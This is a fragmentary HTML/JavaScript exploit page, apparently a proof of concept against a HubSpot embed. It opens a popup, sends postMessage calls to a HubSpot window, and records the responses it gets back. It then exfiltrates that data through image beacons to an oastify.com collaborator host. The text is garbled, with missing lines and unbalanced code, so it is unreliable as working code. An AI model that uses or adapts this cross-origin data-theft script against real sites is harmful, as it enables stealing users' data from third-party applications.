<html>

    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        const blob = new Blob([`
<html>
<body>
<h2>Popup Exploitation</h2>

<script>
const E = 'https://l6s5jp6udf0bc26os0vl0scprgx7l19q.oastify.com';

    new Image().src = E + '/?s=' + encodeURIComponent(m);

        } catch(e) {
            clearInterval(checker);
            l('hubspot_loaded_after_' + attempts);
            
            // NOW ADD: Listen for responses

                    l('GOT_RESPONSE_from=' + resp.origin);
                    l('response_type=' + (resp.data.type || 'unknown'));
                    
                    const data = JSON.stringify(resp.data).substring(0, 400);

                hub.postMessage({
